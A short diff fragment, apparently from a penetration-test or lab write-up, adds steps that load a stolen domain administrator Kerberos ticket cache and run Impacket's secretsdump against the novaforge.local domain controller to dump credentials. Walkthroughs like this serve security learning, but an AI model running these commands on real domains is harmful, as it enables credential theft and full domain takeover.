@@ -1231,5 +1231,13 @@ Impacket v0.14.0.dev0+20260805.100140.701354e9 - Copyright Fortra, LLC and its a
 Now i have the ccache file for the domain admin!
 
 ```python
+export KRB5CCNAME=administrator@cifs_dc.novaforge.local@NOVAFORGE.LOCAL.ccache
+```
 
+Now ill export it
+
+```python
+secretsdump.py -k -no-pass dc.novaforge.local
+
+...[]...
 ```
